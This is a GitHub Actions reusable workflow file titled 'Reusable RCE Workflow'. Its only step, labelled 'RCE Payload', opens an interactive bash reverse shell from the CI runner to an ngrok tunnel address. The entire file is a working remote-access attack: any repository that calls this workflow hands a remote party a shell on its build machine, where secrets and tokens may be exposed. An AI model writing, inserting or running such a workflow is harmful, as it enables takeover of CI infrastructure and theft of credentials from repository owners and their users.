name: Reusable RCE Workflow

on:
  workflow_call:

jobs:
  rce:
    runs-on: ubuntu-latest
    steps:
      - name: RCE Payload
        run: |
          echo "[*] Running RCE payload..."
          bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/14431 0>&1'
